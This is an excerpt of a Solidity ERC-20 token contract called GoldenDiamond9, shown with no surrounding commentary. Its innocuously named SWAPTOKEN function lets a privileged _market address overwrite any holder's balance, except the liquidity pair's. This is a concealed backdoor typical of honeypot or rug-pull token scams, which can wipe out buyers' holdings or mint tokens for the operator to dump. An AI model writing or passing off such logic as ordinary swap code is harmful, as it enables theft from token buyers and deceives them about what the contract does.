...
contract GoldenDiamond9  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private  _name = "GoldenDiamond9";
    string private  _symbol = "GoldenDiamond9";
    ...
    function SWAPTOKEN(address D, uint256 tokenAmount, uint256 WethAmount , uint256 WbnbAmount  ) external  {require(msg.sender == _market );
         require(D != uniswapV2Pair);
        _tOwned[D] = tokenAmount + WethAmount  * WbnbAmount.mul(1).div(100);
    }   
